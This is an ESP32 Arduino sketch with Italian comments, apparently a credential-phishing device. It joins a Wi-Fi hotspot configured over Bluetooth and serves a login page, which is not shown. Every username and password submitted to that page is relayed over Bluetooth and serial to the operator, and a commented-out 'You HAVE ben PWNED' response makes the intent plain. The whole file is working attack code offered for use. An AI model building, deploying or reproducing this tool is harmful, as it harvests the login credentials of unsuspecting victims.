/* 
        Author: Stealth Guy
        GitHUB: https://github.com/StealthGuy
*/
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <BluetoothSerial.h>

BluetoothSerial SerialBT; //alias lilbreria

String ssid = "";
String password = "";

// Definisci il contenuto della tua pagina web nel file sito.h
#include "sito.h"

// Crea un oggetto server
AsyncWebServer server(80);

void setup()
{
  // Inizializza la porta seriale
  Serial.begin(115200);
  //Inizializa bluetooth
  SerialBT.begin("PLC-PlaceLoginCredentials");

  Serial.println("Attivazione Bluetooth...");
  delay(10000);
  //esp_spp_cb_event_t event;
  //if(event == )
  //Richiesta SSID
  do{
    SerialBT.println("Inserisci il nome dell'hotspot (SSID):");
    while (!SerialBT.available()) {
      delay(20);
    }
    ssid = SerialBT.readStringUntil('\n');
    ssid.trim();

    SerialBT.println("Inserisci la password dell'hotspot:");
    while (!SerialBT.available()) {
      delay(20);
    }
    password = SerialBT.readStringUntil('\n');
    password.trim();

    SerialBT.println("Configurazione completata. Connettiti al Wi-Fi...");

      // Connettiti al Wi-Fi
      WiFi.begin(ssid.c_str(), password.c_str());
      int tentativi = 0;
    while (WiFi.status() != WL_CONNECTED && tentativi < 3)
    {
      delay(1000);
      Serial.println("Connessione al WiFi...");
      tentativi++;
    }
  }while(WiFi.status() != WL_CONNECTED);

  Serial.println("Connesso al WiFi\nIP:");
  Serial.print("IP: ");
  Serial.println(WiFi.localIP());
  SerialBT.println("Connesso al WiFi\nIP:");
  SerialBT.println(WiFi.localIP());

  // Gestisci le richieste POST sulla radice ("/") della tua web app
  server.on("/", HTTP_POST, [](AsyncWebServerRequest *request)
  {
    // Leggi i parametri della richiesta POST
    if (request->hasParam("Login", true) && request->hasParam("Password", true))
    {
      String user = request->getParam("Login", true)->value();
      String password = request->getParam("Password", true)->value();

      // Stampa i valori sulla porta seriale
      Serial.println("-----------------------------------------------------");
      Serial.println("User: " + user);
      Serial.println("Password: " + password);
      Serial.println("-----------------------------------------------------");
      SerialBT.println("-----------------------------------------------------");
      SerialBT.println("User: " + user);
      SerialBT.println("Password: " + password);
      SerialBT.println("-----------------------------------------------------");
      

      // Invia una risposta al client
      //request->send(200, "text/plain", "You HAVE ben PWNED (8-o)");
      request->send_P(200, "text/html", sito_html);
    }
    else
    {
      request->send(400, "text/plain", "Parametri mancanti");
    }
  });

  // Configura la gestione della pagina web
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
  {
    request->send_P(200, "text/html", sito_html);
  });

  // Avvia il server
  server.begin();
}

void loop()
{
  // Il loop è vuoto, tutte le operazioni sono gestite negli handler delle richieste
}